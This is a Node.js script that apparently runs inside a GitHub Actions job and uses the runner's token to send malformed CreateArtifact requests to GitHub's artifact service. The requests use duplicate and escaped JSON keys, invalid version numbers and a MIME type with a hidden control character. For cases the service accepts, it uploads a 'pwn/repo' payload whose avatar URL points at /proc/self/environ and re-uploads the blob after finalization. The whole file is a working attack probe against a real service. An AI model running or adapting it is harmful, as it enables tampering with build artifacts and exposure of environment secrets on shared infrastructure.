import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const weird = 'application/json\u0085';
const body = Buffer.from(JSON.stringify({
  full_name: 'pwn/repo',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette duplicate-field carrier',
  stargazers_count: 0,
}));
const digest = createHash('sha256').update(body).digest('hex');
const client = internalArtifactTwirpClient({maxAttempts: 1});

function quoted(value) {
  return JSON.stringify(value);
}

async function rawCreate(name, fields) {
  const raw = '{' +
    '"workflow_run_backend_id":' + quoted(ids.workflowRunBackendId) + ',' +
    '"workflow_job_run_backend_id":' + quoted(ids.workflowJobRunBackendId) + ',' +
    '"name":' + quoted(name) + ',' + fields + '}';
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      'content-type': 'application/json',
    },
    body: raw,
  });
  const text = await response.text();
  let result = {};
  try { result = JSON.parse(text); } catch {}
  return {
    status: response.status,
    text,
    signedUploadUrl: result.signed_upload_url || result.signedUploadUrl || '',
    ok: result.ok,
  };
}

async function publish(name, signedUploadUrl) {
  const blob = new BlobClient(signedUploadUrl).getBlockBlobClient();
  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(body.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });
  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
  return String(result.artifactId);
}

const cases = [
  ['control-v7', '"version":7,"mime_type":"application/json"'],
  ['control-v6', `"version":6,"mime_type":${quoted(weird)}`],
  ['version-minus-one',
    `"version":-1,"mime_type":${quoted(weird)}`],
  ['version-minus-two',
    `"version":-2,"mime_type":${quoted(weird)}`],
  ['version-int-min',
    `"version":-2147483648,"mime_type":${quoted(weird)}`],
  ['version-int-max',
    `"version":2147483647,"mime_type":${quoted(weird)}`],
  ['version-seven-null-mime', '"version":7,"mime_type":null'],
  ['version-seven-no-mime', '"version":7'],
  ['mime-valid-weird',
    `"version":7,"mime_type":"application/json","mime_type":${quoted(weird)}`],
  ['mime-weird-valid',
    `"version":7,"mime_type":${quoted(weird)},"mime_type":"application/json"`],
  ['mime-snake-camel',
    `"version":7,"mime_type":"application/json","mimeType":${quoted(weird)}`],
  ['mime-camel-snake',
    `"version":7,"mimeType":${quoted(weird)},"mime_type":"application/json"`],
  ['version-seven-six',
    `"version":7,"version":6,"mime_type":${quoted(weird)}`],
  ['version-six-seven',
    `"version":6,"version":7,"mime_type":${quoted(weird)}`],
  ['escaped-key-valid-weird',
    `"version":7,"mime_type":"application/json","mime_\\u0074ype":${quoted(weird)}`],
  ['escaped-key-weird-valid',
    `"version":7,"mime_\\u0074ype":${quoted(weird)},"mime_type":"application/json"`],
];

const report = [];
for (const [label, fields] of cases) {
  const name = `wire-${process.env.GITHUB_RUN_ID}-${label}`;
  try {
    const created = await rawCreate(name, fields);
    const item = {
      label,
      status: created.status,
      ok: created.ok,
      response: created.text.slice(0, 220),
    };
    if (created.signedUploadUrl) {
      item.path = new URL(created.signedUploadUrl).pathname.split('.').at(-1);
      item.artifactId = await publish(name, created.signedUploadUrl);
    }
    report.push(item);
    console.log(`WIRE ${JSON.stringify(item)}`);
  } catch (error) {
    const item = {label, error: String(error).slice(0, 300)};
    report.push(item);
    console.log(`WIRE ${JSON.stringify(item)}`);
  }
}
console.log(`WIRE_REPORT ${JSON.stringify(report)}`);
